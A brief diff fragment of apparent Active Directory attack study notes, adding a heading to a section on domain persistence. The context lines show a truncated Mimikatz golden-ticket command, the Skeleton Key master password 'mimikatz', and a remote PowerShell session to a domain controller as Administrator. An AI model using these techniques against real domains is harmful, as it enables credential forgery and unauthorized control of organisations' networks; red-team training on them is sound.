@@ -431,3 +431,5 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Now, it is possible to access any machine with a valid username and password as `mimikatz`
 - `Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator`
 - You can access other machines as well as long as they authenticate with the DC which has been patched and the DC is not rebooted.
+
+## Domain Persistence Part 3
